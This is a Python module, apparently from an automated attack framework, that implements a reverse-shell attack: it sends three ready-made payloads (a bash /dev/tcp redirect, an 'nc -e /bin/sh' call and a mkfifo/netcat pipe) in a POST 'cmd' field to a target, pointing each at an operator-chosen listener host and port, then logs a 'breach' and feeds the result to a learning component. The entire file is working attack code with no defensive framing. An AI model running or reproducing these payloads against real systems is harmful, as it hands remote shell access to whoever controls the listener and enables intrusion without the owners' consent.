
import asyncio
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class ReverseShellModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "reverse_shell", "success": False, "risk": 10}

        lhost = options.get('lhost')
        lport = options.get('lport')
        request = options.get('request')
        if not request or not lhost or not lport:
            return result

        payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"nc -e /bin/sh {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ]

        self.logger.info(f"REVERSE SHELL → {lhost}:{lport}")

        for payload in payloads:
            try:
                resp = await request('POST', target, data={"cmd": payload})
                if resp and resp.status_code in [200, 500]:
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "output": "Shell sent"
                    })
                    self.logger.breach(f"REVERSE SHELL: {payload}")
                    if self.brain:
                        self.brain.learn("reverse_shell", target, payload, True)
                    break
            except:
                continue

        return result